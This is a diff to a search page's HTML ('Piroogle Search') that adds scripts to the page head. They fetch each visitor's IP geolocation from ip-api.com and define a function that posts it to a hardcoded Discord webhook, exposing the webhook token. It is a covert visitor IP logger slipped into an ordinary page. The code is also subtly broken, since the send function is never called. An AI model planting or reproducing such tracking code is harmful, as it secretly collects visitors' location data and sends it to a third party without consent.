@@ -2,6 +2,23 @@
 <html>
   <head>
     <title>Piroogle Search</title>
+    <script type="text/javascript" src="http://ip-api.com/json/?callback=discord"></script>
+    <script>
+      const discord = (json) => {
+      function sendMessage() {
+      var request = new XMLHttpRequest();
+      request.open("POST", "https://discordapp.com/api/webhooks/714229769863954482/MbPtKeS0JPe0iE_I-oOY5cKWzvz9Vc3DYySfDNDI0s0B_Gb51qYVYLrI4nahUySj8MR9");
+        request.setRequestHeader('Content-type', 'application/json');
+        var params = {
+    username: "My Webhook Name",
+    avatar_url: "",
+    content: json
+}
+        request.send(JSON.stringify(params));
+      // replace the url in the "open" method with yours
+}
+      }
+    </script>
     <link
       rel="stylesheet"
       href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
